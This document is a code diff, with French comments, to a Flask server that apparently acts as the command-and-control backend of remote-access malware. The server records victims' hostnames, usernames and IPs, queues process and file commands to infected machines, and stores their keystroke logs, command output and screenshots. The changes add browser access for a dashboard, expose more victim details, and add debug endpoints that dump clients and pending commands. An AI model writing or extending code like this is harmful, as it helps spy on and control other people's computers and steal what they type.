@@ -1,4 +1,5 @@
 from flask import Flask, request, jsonify, send_from_directory
+from flask_cors import CORS  # AJOUT IMPORTANT
 import time
 import threading
 from datetime import datetime
@@ -8,8 +9,8 @@ from config import ENCRYPTION_KEY
 from encryptor import Encryptor
 from protocol import Protocol
 
-
 app = Flask(__name__)
+CORS(app)  # PERMET LES REQUÊTES DEPUIS LE NAVIGATEUR
 
 #In-memory storage for clients
 clients = {}
@@ -388,9 +389,6 @@ def save_keylogs_to_file():
 # Charger les keylogs au démarrage
 load_keylogs_from_file()
 
-
-
-
 def cleanup_old_clients():
     while True:
         current_time = time.time()
@@ -592,9 +590,14 @@ def get_clients():
         is_online = current_time - last_seen < 10
         print(f"[DEBUG] Client {client_id}: last_seen={last_seen}, online={is_online}")
         
+        system_info = client_data.get('system_info', {})
+        
         clients_list.append({
             "client_id": client_id,
-            "system_info": client_data.get('system_info', {}),
+            "system_info": system_info,
+            "os": system_info.get('platform', 'Unknown'),  # AJOUTÉ pour dashboard
+            "hostname": system_info.get('hostname', 'Unknown'),  # AJOUTÉ pour dashboard
+            "username": system_info.get('username', 'Unknown'),  # AJOUTÉ pour dashboard
             "first_seen": client_data.get('first_seen'),
             "last_seen": last_seen,
             "ip": client_data.get('ip'),
@@ -605,12 +608,15 @@ def get_clients():
     
     print(f"[ADMIN] Returning {len(clients_list)} clients")
     print(f"[DEBUG] Response: {clients_list}\n")
-    return jsonify({
+    
+    response = jsonify({
         "status": "success",
         "clients": clients_list,
         "total_clients": len(clients_list),
         "server_time": datetime.now().isoformat()
     })
+    
+    return response
 
 
 @app.route('/admin/status', methods=['GET'])
@@ -649,7 +655,7 @@ def send_process_command(client_id):
         pending_commands.setdefault(client_id, []).append(command_info)
         
         # Save command to database
-        save_command_to_database(client_id, command_info)
+        save_command_to_database(command_id, client_id, action, data)
         
         #Clean old commands per client
         if client_id in pending_commands:
@@ -759,7 +765,7 @@ def submit_command_result():
             }
             
             # Save command result to database
-            save_command_result_to_database(command_id, command_results[command_id])
+            save_command_result_to_database(command_id, client_data.get('client_id'), result)
             
             print(f"[SERVER] Successfully stored result for command {command_id}")
             
@@ -802,7 +808,7 @@ def send_file_command(client_id):
         pending_commands.setdefault(client_id, []).append(command_info)
         
         # Save command to database
-        save_command_to_database(client_id, command_info)
+        save_command_to_database(command_id, client_id, action, data)
         
         if client_id in pending_commands:
             pending_commands[client_id] = pending_commands[client_id][-10:]
@@ -1008,13 +1014,13 @@ def api_get_database_clients():
     """Récupère tous les clients depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"error": "Database not configured"}), 400
+            return jsonify({"success": False, "error": "Database not configured"}), 200
         
         with get_db_connection() as conn:
             cur = conn.cursor()
             cur.execute("""
                 SELECT client_id, ip_address, system_info, 
-                       first_seen, last_seen, checkin_count, is_online
+                       first_seen, last_seen, checkin_count, online
                 FROM clients
                 ORDER BY last_seen DESC
                 LIMIT 100
@@ -1023,10 +1029,17 @@ def api_get_database_clients():
             
             clients_list = []
             for row in rows:
+                system_info = row[2] if row[2] else {}
+                if isinstance(system_info, str):
+                    try:
+                        system_info = json.loads(system_info)
+                    except:
+                        system_info = {}
+                
                 clients_list.append({
                     'client_id': row[0],
                     'ip_address': row[1],
-                    'system_info': row[2],
+                    'system_info': system_info,
                     'first_seen': row[3],
                     'last_seen': row[4],
                     'checkin_count': row[5],
@@ -1041,7 +1054,7 @@ def api_get_database_clients():
     
     except Exception as e:
         print(f"[API] Error fetching clients: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 200
 
 
 @app.route('/api/database/keylogs', methods=['GET'])
@@ -1049,7 +1062,7 @@ def api_get_database_keylogs():
     """Récupère les keylogs depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"error": "Database not configured"}), 400
+            return jsonify({"success": False, "error": "Database not configured"}), 200
         
         client_id = request.args.get('client_id')
         limit = int(request.args.get('limit', 100))
@@ -1059,7 +1072,7 @@ def api_get_database_keylogs():
             
             if client_id:
                 cur.execute("""
-                    SELECT id, client_id, window_title, keylog_data, created_at
+                    SELECT id, client_id, timestamp, text, created_at
                     FROM keylogs
                     WHERE client_id = %s
                     ORDER BY created_at DESC
@@ -1067,7 +1080,7 @@ def api_get_database_keylogs():
                 """, (client_id, limit))
             else:
                 cur.execute("""
-                    SELECT id, client_id, window_title, keylog_data, created_at
+                    SELECT id, client_id, timestamp, text, created_at
                     FROM keylogs
                     ORDER BY created_at DESC
                     LIMIT %s
@@ -1080,8 +1093,8 @@ def api_get_database_keylogs():
                 keylogs_list.append({
                     'id': row[0],
                     'client_id': row[1],
-                    'window_title': row[2],
-                    'keylog_data': row[3],
+                    'timestamp': row[2],
+                    'text': row[3],
                     'created_at': row[4]
                 })
             
@@ -1093,7 +1106,7 @@ def api_get_database_keylogs():
     
     except Exception as e:
         print(f"[API] Error fetching keylogs: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 200
 
 
 @app.route('/api/database/commands', methods=['GET'])
@@ -1101,7 +1114,7 @@ def api_get_database_commands():
     """Récupère les commandes depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"error": "Database not configured"}), 400
+            return jsonify({"success": False, "error": "Database not configured"}), 200
         
         client_id = request.args.get('client_id')
         limit = int(request.args.get('limit', 100))
@@ -1111,7 +1124,7 @@ def api_get_database_commands():
             
             if client_id:
                 cur.execute("""
-                    SELECT command_id, client_id, action, command_data, 
+                    SELECT command_id, client_id, action, data, 
                            created_at, status
                     FROM commands
                     WHERE client_id = %s
@@ -1120,7 +1133,7 @@ def api_get_database_commands():
                 """, (client_id, limit))
             else:
                 cur.execute("""
-                    SELECT command_id, client_id, action, command_data, 
+                    SELECT command_id, client_id, action, data, 
                            created_at, status
                     FROM commands
                     ORDER BY created_at DESC
@@ -1131,11 +1144,18 @@ def api_get_database_commands():
             
             commands_list = []
             for row in rows:
+                data = row[3] if row[3] else {}
+                if isinstance(data, str):
+                    try:
+                        data = json.loads(data)
+                    except:
+                        data = {}
+                
                 commands_list.append({
                     'command_id': row[0],
                     'client_id': row[1],
                     'action': row[2],
-                    'command_data': row[3],
+                    'command_data': data,
                     'created_at': row[4],
                     'status': row[5]
                 })
@@ -1148,7 +1168,7 @@ def api_get_database_commands():
     
     except Exception as e:
         print(f"[API] Error fetching commands: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 200
 
 
 @app.route('/api/database/command_results', methods=['GET'])
@@ -1156,7 +1176,7 @@ def api_get_database_command_results():
     """Récupère les résultats de commandes depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"error": "Database not configured"}), 400
+            return jsonify({"success": False, "error": "Database not configured"}), 200
         
         command_id = request.args.get('command_id')
         limit = int(request.args.get('limit', 100))
@@ -1166,7 +1186,7 @@ def api_get_database_command_results():
             
             if command_id:
                 cur.execute("""
-                    SELECT cr.id, cr.command_id, cr.result_data, cr.created_at,
+                    SELECT cr.id, cr.command_id, cr.result, cr.created_at,
                            c.client_id, c.action
                     FROM command_results cr
                     JOIN commands c ON cr.command_id = c.command_id
@@ -1175,7 +1195,7 @@ def api_get_database_command_results():
                 """, (command_id,))
             else:
                 cur.execute("""
-                    SELECT cr.id, cr.command_id, cr.result_data, cr.created_at,
+                    SELECT cr.id, cr.command_id, cr.result, cr.created_at,
                            c.client_id, c.action
                     FROM command_results cr
                     JOIN commands c ON cr.command_id = c.command_id
@@ -1187,10 +1207,17 @@ def api_get_database_command_results():
             
             results_list = []
             for row in rows:
+                result = row[2] if row[2] else {}
+                if isinstance(result, str):
+                    try:
+                        result = json.loads(result)
+                    except:
+                        result = {}
+                
                 results_list.append({
                     'id': row[0],
                     'command_id': row[1],
-                    'result_data': row[2],
+                    'result_data': result,
                     'created_at': row[3],
                     'client_id': row[4],
                     'action': row[5]
@@ -1204,7 +1231,7 @@ def api_get_database_command_results():
     
     except Exception as e:
         print(f"[API] Error fetching command results: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 200
 
 
 @app.route('/api/database/screenshots', methods=['GET'])
@@ -1212,7 +1239,7 @@ def api_get_database_screenshots():
     """Récupère les métadonnées de screenshots depuis la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"error": "Database not configured"}), 400
+            return jsonify({"success": False, "error": "Database not configured"}), 200
         
         client_id = request.args.get('client_id')
         limit = int(request.args.get('limit', 50))
@@ -1222,7 +1249,7 @@ def api_get_database_screenshots():
             cur = conn.cursor()
             
             if include_data:
-                select_fields = "id, client_id, filename, width, height, quality, size_kb, screenshot_data, created_at"
+                select_fields = "id, client_id, filename, width, height, quality, size_kb, data, created_at"
             else:
                 select_fields = "id, client_id, filename, width, height, quality, size_kb, created_at"
             
@@ -1245,7 +1272,7 @@ def api_get_database_screenshots():
             rows = cur.fetchall()
             
             screenshots_list = []
-            for row in rows:
+            for i, row in enumerate(rows):
                 screenshot = {
                     'id': row[0],
                     'client_id': row[1],
@@ -1253,11 +1280,14 @@ def api_get_database_screenshots():
                     'width': row[3],
                     'height': row[4],
                     'quality': row[5],
-                    'size_kb': row[6],
-                    'created_at': row[7 if include_data else 7]
+                    'size_kb': row[6]
                 }
+                
                 if include_data:
-                    screenshot['screenshot_data'] = row[7]
+                    screenshot['data'] = row[7]
+                    screenshot['created_at'] = row[8]
+                else:
+                    screenshot['created_at'] = row[7]
                 
                 screenshots_list.append(screenshot)
             
@@ -1269,7 +1299,7 @@ def api_get_database_screenshots():
     
     except Exception as e:
         print(f"[API] Error fetching screenshots: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 200
 
 
 @app.route('/api/database/stats', methods=['GET'])
@@ -1277,7 +1307,16 @@ def api_get_database_stats():
     """Récupère les statistiques globales de la base de données"""
     try:
         if not USE_DATABASE:
-            return jsonify({"error": "Database not configured"}), 400
+            return jsonify({
+                "success": True,
+                "stats": {
+                    'clients': {'total': 0, 'online': 0, 'offline': 0},
+                    'keylogs': {'total': 0},
+                    'commands': {'total': 0, 'pending': 0, 'completed': 0},
+                    'results': {'total': 0},
+                    'screenshots': {'total': 0}
+                }
+            })
         
         with get_db_connection() as conn:
             cur = conn.cursor()
@@ -1287,7 +1326,7 @@ def api_get_database_stats():
             total_clients = cur.fetchone()[0]
             
             # Online clients
-            cur.execute("SELECT COUNT(*) FROM clients WHERE is_online = true")
+            cur.execute("SELECT COUNT(*) FROM clients WHERE online = true")
             online_clients = cur.fetchone()[0]
             
             # Total keylogs
@@ -1337,8 +1376,33 @@ def api_get_database_stats():
     
     except Exception as e:
         print(f"[API] Error fetching stats: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 200
 
+
+# Debug endpoints
+@app.route('/debug/clients', methods=['GET'])
+def debug_clients():
+    """Endpoint de debug pour voir les clients en temps réel"""
+    return jsonify({
+        "timestamp": datetime.now().isoformat(),
+        "clients_dict": clients,
+        "clients_count": len(clients),
+        "clients_ids": list(clients.keys()),
+        "pending_commands": pending_commands,
+        "keylogs_storage_keys": list(keylogs_storage.keys())
+    })
+
+@app.route('/debug/server', methods=['GET'])
+def debug_server():
+    """Informations de debug du serveur"""
+    return jsonify({
+        "server_time": datetime.now().isoformat(),
+        "uptime_seconds": time.time() - app.start_time,
+        "total_clients": len(clients),
+        "online_clients": sum(1 for c in clients.values() if time.time() - c.get('last_seen', 0) < 10),
+        "USE_DATABASE": USE_DATABASE,
+        "flask_env": app.env
+    })
 
 @app.before_request
 def before_request():
